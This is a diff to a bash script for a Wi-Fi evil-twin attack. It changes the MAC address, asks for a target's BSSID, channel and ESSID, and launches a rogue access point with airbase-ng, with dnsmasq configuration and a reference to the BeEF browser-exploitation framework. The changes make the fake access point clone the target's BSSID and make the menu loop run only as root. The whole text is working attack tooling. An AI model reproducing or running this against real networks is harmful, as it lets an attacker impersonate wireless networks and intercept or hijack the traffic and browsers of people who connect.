@@ -105,7 +105,7 @@ echo "Changing MAC ... "
 	sleep 2
 clear
 
-while [[ 1 == 1 ]] ; do
+while [[ $(id -u) == 0 ]] ; do
 	clear
 	cat <<-_EOF_
 
@@ -221,7 +221,7 @@ listen-address=127.0.0.1 " > /bin/dnsmasq.conf
 	read -p "${yellow}Enter your target's channel here ${resetColor} : " CHANNEL
 	read -p "${yellow}Enter your target's ESSID [Name] here ${resetColor} : " ESSID
 	echo " ${yellow}Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
-	gnome-terminal -x airbase-ng -e $ESSID --channel $CHANNEL $INTERFACE$MON
+	gnome-terminal -x airbase-ng -a $BSSID -e $ESSID --channel $CHANNEL $INTERFACE$MON
 	sleep 5 
 	gnome-terminal -x ifconfig at0 10.0.0.1 up 
 			
@@ -284,7 +284,7 @@ listen-address=127.0.0.1 " > /etc/beef/dnsmasq.conf # add this to both beef and 
 	read -p "${yellow}Enter your target's channel here ${resetColor} : " CHANNEL
 	read -p "${yellow}Enter your target's ESSID [Name] here ${resetColor} : " ESSID
 	echo " ${yellow}Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
-	gnome-terminal -x airbase-ng -e $ESSID --channel $CHANNEL $INTERFACE$MON
+	gnome-terminal -x airbase-ng -a $BSSID -e $ESSID --channel $CHANNEL $INTERFACE$MON
 	sleep 5 
 	gnome-terminal -x ifconfig at0 10.0.0.1 up 
 			
